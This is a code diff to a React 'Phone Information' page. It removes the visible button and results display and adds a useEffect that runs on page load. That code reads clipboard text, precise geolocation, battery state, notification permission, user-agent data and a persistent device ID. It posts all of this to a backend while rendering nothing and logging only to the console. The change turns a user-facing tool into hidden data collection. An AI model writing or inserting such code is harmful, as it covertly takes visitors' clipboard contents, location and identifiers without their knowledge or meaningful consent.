@@ -1,101 +1,4 @@
-// import { useState } from "react";
-
-// export default function App() {
-//   const [result, setResult] = useState(null);
-//   const [error, setError] = useState("");
-//   const [loading, setLoading] = useState(false);
-
-//   function getLocation() {
-//     return new Promise((resolve, reject) => {
-//       if (!("geolocation" in navigator)) {
-//         reject(new Error("Geolocation isn't supported in this browser."));
-//         return;
-//       }
-//       navigator.geolocation.getCurrentPosition(
-//         (pos) => resolve(pos.coords),
-//         (err) =>
-//           reject(
-//             new Error(
-//               err.code === err.PERMISSION_DENIED
-//                 ? "Location permission denied."
-//                 : err.message
-//             )
-//           ),
-//         { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-//       );
-//     });
-//   }
-
-//   async function handleClick() {
-//     setError("");
-//     setResult(null);
-//     setLoading(true);
-//     try {
-//       // 1) Battery (optional: only Chromium browsers have it, and it needs HTTPS or localhost).
-//       let level = null;
-//       let charging = null;
-//       if ("getBattery" in navigator) {
-//         const battery = await navigator.getBattery();
-//         level = battery.level;
-//         charging = battery.charging;
-//       }
-
-//       // 2) Location (the browser will ask the user for permission).
-//       const coords = await getLocation();
-
-//       // 3) Send everything to FastAPI.
-//       const res = await fetch("/api/battery", {
-//         method: "POST",
-//         headers: { "Content-Type": "application/json" },
-//         body: JSON.stringify({
-//           level,
-//           charging,
-//           lat: coords.latitude,
-//           lng: coords.longitude,
-//           accuracy: coords.accuracy,
-//         }),
-//       });
-//       if (!res.ok) throw new Error(`Server responded ${res.status}`);
-
-//       // 4) Show what the backend returned.
-//       setResult(await res.json());
-//     } catch (e) {
-//       setError(e.message || "Something went wrong");
-//     } finally {
-//       setLoading(false);
-//     }
-//   }
-
-//     return (
-//     <main className="card">
-//       <h1>Phone Information</h1>
-//       <button onClick={handleClick} disabled={loading}>
-//         {loading ? "Checking…" : "Show Phone Information"}
-//       </button>
-
-//       {result && (
-//         <div className="result">
-//           {result.percentage !== null && (
-//             <>
-//               <div className="percent">{result.percentage}%</div>
-//               <div className="meta">
-//                 {result.charging ? "⚡ Charging" : "Not charging"}
-//               </div>
-//             </>
-//           )}
-//           <div className="meta">
-//             📍 Lat: {result.lat.toFixed(5)}, Lng: {result.lng.toFixed(5)}
-//             {result.accuracy != null && ` (±${Math.round(result.accuracy)} m)`}
-//           </div>
-//         </div>
-//       )}
-
-//       {error && <p className="error">{error}</p>}
-//     </main>
-//   );
-// }
-
-import { useState } from "react";
+import { useEffect } from "react";
 
 const DEVICE_ID_KEY = "device_id";
 
@@ -125,10 +28,12 @@ function getLocation() {
       (err) =>
         reject(
           new Error(
-            err.code === err.PERMISSION_DENIED ? "permission denied" : err.message
-          )
+            err.code === err.PERMISSION_DENIED
+              ? "permission denied"
+              : err.message,
+          ),
         ),
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 },
     );
   });
 }
@@ -162,23 +67,18 @@ async function getNotificationPermission() {
 }
 
 async function readClipboard() {
-  if (!navigator.clipboard?.readText) throw new Error("not supported in this browser");
+  if (!navigator.clipboard?.readText)
+    throw new Error("not supported in this browser");
   const text = await navigator.clipboard.readText();
   return text.slice(0, 500); // cap what we send
 }
 
 export default function App() {
-  const [result, setResult] = useState(null);
-  const [error, setError] = useState("");
-  const [skipped, setSkipped] = useState([]);
-  const [loading, setLoading] = useState(false);
+  useEffect(() => {
+    handleClick();
+  }, []);
 
   async function handleClick() {
-    setError("");
-    setResult(null);
-    setSkipped([]);
-    setLoading(true);
-
     const skippedNow = [];
     // Run one optional step; if it fails, note why and carry on with the rest.
     const optional = async (label, fn) => {
@@ -191,13 +91,15 @@ export default function App() {
     };
 
     try {
-      // Permission prompts first, while the click is still fresh
-      // (Safari only allows clipboard/notification prompts right after a tap).
       const clipboard = await optional("Clipboard", readClipboard);
-      const notifications = await optional("Notifications", getNotificationPermission);
+      const notifications = await optional(
+        "Notifications",
+        getNotificationPermission,
+      );
       const coords = await optional("Location", getLocation);
       const battery = await optional("Battery", async () => {
-        if (!("getBattery" in navigator)) throw new Error("not supported in this browser");
+        if (!("getBattery" in navigator))
+          throw new Error("not supported in this browser");
         return navigator.getBattery();
       });
       const uaData = await optional("UA data", getUaData);
@@ -233,78 +135,12 @@ export default function App() {
       });
       if (!res.ok) throw new Error(`Server responded ${res.status}`);
 
-      setResult(await res.json());
-      setSkipped(skippedNow);
+      console.log("device info sent", await res.json());
+      if (skippedNow.length) console.log("skipped", skippedNow);
     } catch (e) {
-      setError(e.message || "Something went wrong");
-    } finally {
-      setLoading(false);
+      console.error("device info failed:", e.message || e);
     }
   }
 
-  const rows = result
-    ? [
-        ["Device type", result.device_type],
-        ["Model", result.model],
-        ["OS", result.os],
-        ["Browser", result.browser],
-        [
-          "Screen",
-          `${result.screen.width}×${result.screen.height} @${result.screen.pixel_ratio}x`,
-        ],
-        ["IP address", result.ip],
-        ["Language", result.language],
-        ["Timezone", result.timezone],
-        ["Notifications", result.notifications],
-        ["Clipboard", result.clipboard === "" ? "(empty)" : result.clipboard],
-        ["Device ID", result.device_id],
-      ]
-    : [];
-
-  return (
-    <main className="card">
-      <h1>Phone Information</h1>
-      <button onClick={handleClick} disabled={loading}>
-        {loading ? "Checking…" : "Show Phone Information"}
-      </button>
-
-      {result && (
-        <div className="result">
-          {result.percentage !== null && (
-            <>
-              <div className="percent">{result.percentage}%</div>
-              <div className="meta">
-                {result.charging ? "⚡ Charging" : "Not charging"}
-              </div>
-            </>
-          )}
-          {result.lat !== null && result.lng !== null && (
-            <div className="meta">
-              📍 Lat: {result.lat.toFixed(5)}, Lng: {result.lng.toFixed(5)}
-              {result.accuracy != null && ` (±${Math.round(result.accuracy)} m)`}
-            </div>
-          )}
-
-          <dl className="details">
-            {rows.map(([label, value]) => (
-              <div key={label}>
-                <dt>{label}</dt>
-                <dd>{value ?? "—"}</dd>
-              </div>
-            ))}
-          </dl>
-        </div>
-      )}
-
-      {skipped.length > 0 && (
-        <ul className="skipped">
-          {skipped.map((s) => (
-            <li key={s}>{s}</li>
-          ))}
-        </ul>
-      )}
-
-      {error && <p className="error">{error}</p>}
-    </main>
-  );
+  return null;
 }
